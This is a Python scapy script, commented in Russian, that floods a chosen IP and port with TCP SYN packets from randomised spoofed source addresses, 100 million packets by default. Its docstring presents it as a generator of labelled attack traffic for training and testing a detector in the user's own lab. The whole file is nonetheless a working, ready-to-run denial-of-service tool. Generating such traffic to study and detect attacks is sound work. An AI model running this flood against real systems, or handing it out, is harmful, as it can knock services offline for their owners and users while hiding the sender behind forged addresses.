"""Генератор тестового SYN-flood трафика для проверки детектора.

Назначение — снять размеченный трафик атаки в собственной лаборатории
(своя VM/изолированный стенд), чтобы обучать и проверять модель. Запускать
только против машин, которыми вы владеете или на тест которых есть разрешение.

Требуется привилегированный доступ к сети и (на Windows) установленный Npcap.
"""

import argparse
import sys

from scapy.all import IP, TCP, RandIP, RandShort, send, conf

DEFAULT_TARGET_PORT = 80
DEFAULT_COUNT = 100_000_000


def syn_flood(target_ip: str, target_port: int, count: int) -> None:
    print(f"Запуск SYN Flood на {target_ip}:{target_port}...")
    print(f"Используется Npcap: {conf.use_pcap}")
    try:
        for i in range(count):
            packet = (
                IP(src=RandIP(), dst=target_ip) /
                TCP(sport=RandShort(), dport=target_port, flags="S")
            )
            send(packet, verbose=0)
            if (i + 1) % 100 == 0:
                print(f"Отправлено {i + 1} пакетов...")
        print("SYN Flood завершён.")
    except Exception as e:
        print(f"Ошибка при отправке пакетов: {e}")
        sys.exit(1)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target_ip", help="IP цели в вашей лаборатории")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_TARGET_PORT,
                        help=f"целевой порт (по умолчанию {DEFAULT_TARGET_PORT})")
    parser.add_argument("-c", "--count", type=int, default=DEFAULT_COUNT,
                        help="число пакетов")
    return parser.parse_args()


if __name__ == "__main__":
    # Npcap на Windows; на других ОС флаг игнорируется scapy
    conf.use_pcap = True
    args = parse_args()
    try:
        syn_flood(args.target_ip, args.port, args.count)
    except KeyboardInterrupt:
        print("\nАтака остановлена.")
